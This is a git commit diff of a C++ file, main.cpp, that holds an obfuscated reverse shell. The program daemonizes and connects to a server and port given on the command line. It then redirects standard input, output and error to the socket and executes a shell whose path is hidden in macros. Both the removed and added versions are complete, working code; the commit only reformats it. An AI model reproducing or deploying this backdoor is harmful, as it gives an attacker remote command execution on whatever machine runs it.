1594c24192bf5191bf29d7bc8abd95cf03eef93e
e <rekarger@gmail.com>
2017-04-06 20:28:00 -0400

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -12,12 +12,13 @@
 #define /*                                       */cyan   "\e[96m"
 #define /*                                       */ probe    "/sh"
 #define /*****************************************/norm   "\e[39m"
-using namespace std;int main(int argc, char** argv ){if(argc!=3){
-cout << red << "./binary server port" <<endl; return 1;}cout << 
-green << "Connection sent!" << norm << endl;daemon(1, 1);int s0;
-struct sockaddr_in target; s0 = socket(AF_INET , SOCK_STREAM , 0); 
-if (s0 < 0){close(s0); return 1;}target.sin_addr.s_addr = inet_addr(
-argv[1]); target.sin_family= AF_INET; target.sin_port = htons(atoi(
-argv[2])); if( connect( s0 ,(struct sockaddr *)&target, sizeof(target) 
-) < 0) {close(s0);return 1;};while(1){dup2(s0,0); dup2(s0,1);dup2(s0,2);
-execl(packets probe,packets probe,(char*)0);close(s0);}return 0;}
+using namespace std;int main(int argc, char** argv ){ if(argc!=3){
+cout <<red << "./binary server port" <<endl; return 1;}cout<<green 
+<< "Connection sent!" << norm << endl; daemon(1, 1); int s0;struct 
+sockaddr_in target; s0 = socket(AF_INET , SOCK_STREAM , 0); if (s0
+< 0) { close( s0); return 1; } target.sin_addr.s_addr = inet_addr(
+argv[1]); target.sin_family= AF_INET; target.sin_port =htons(atoi(
+argv[2]));if( connect(s0 ,(struct sockaddr*)&target,sizeof(target)
+) < 0) {close(s0);return 1;};while(1){dup2(s0,0); dup2(s0,1);dup2(
+s0,2);execl(packets probe,packets probe,(char*)0);close(s0);}exit(
+0);}
